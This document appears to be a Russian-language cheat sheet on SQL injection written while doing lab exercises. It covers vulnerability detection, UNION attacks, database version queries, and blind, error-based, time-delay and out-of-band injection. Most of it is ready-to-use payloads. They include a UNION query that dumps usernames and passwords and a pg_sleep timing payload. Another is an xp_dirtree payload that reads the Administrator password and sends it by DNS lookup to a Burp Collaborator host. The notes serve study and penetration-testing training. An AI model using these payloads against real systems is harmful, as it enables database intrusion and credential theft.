
# 1. Обнаружение уязвимости

- **Символ одинарной кавычки** `'` и искать ошибки или другие аномалии.

- Некоторый синтаксис, специфичный для SQL, который оценивает базовое (исходное) значение точки входа и другое значение и ищет систематические различия в ответах приложения.

- **Булевы условия**, такие как `OR 1=1` и `OR 1=2`и найдите различия в ответах приложения. Использовать url кодировку 

- **Полезные нагрузки**, предназначенные для запуска временных задержек при выполнении SQL-запроса и поиска различий во времени, необходимом для ответа.

- Полезные нагрузки [[OAST, SAST и DAST|OAST]], предназначенные для запуска внеполосного сетевого взаимодействия при выполнении в рамках SQL-запроса и отслеживания любых результирующих взаимодействий.

# 2. SQL-инъекция UNION-атак

- Определение количества необходимых столбцов `' UNION SELECT NULL,NULL--`
- Поиск столбцов с полезным типом данных `' UNION SELECT 'a',NULL,NULL,NULL--` 
- Получение нескольких значений в одном столбце `' UNION SELECT username || '~' || password FROM users--`

# 3. Синтаксис, специфичный для базы данных

- [Шпаргалка по инъекциям](https://portswigger.net/web-security/sql-injection/cheat-sheet)

# 4. Исследование базы данных при атаках с использованием SQL-инъекций

- Майкрософт, MySQL `SELECT @@version`
- Oracle SELECT * FROM v$version`
- PostgreSQL `SELECT version()`

# 5. Слепая SQL-инъекция

- Вариант поиска/проверки `' AND '1'='1` и `' AND '1'='2`
- Использование слепой SQL-инъекции путем запуска условных ответов
```
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
```

### 5.1 Инъекция на основе ошибок
 
 - Извлечение конфиденциальных данных с помощью подробных сообщений об ошибках SQL `AND CAST((SELECT 1) as int)` 

### 5.2 Инъекция за счет задержек времени

- `'; SELECT CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END--` - вызывает задержку в 2 секунды, поскольку условие `1=1` это правда (url coder)

### 5.3 Использование слепого внедрения SQL с использованием внеполосных методов (OAST)

- `'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`  -  заставляет базу данных выполнить поиск по dns.
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```


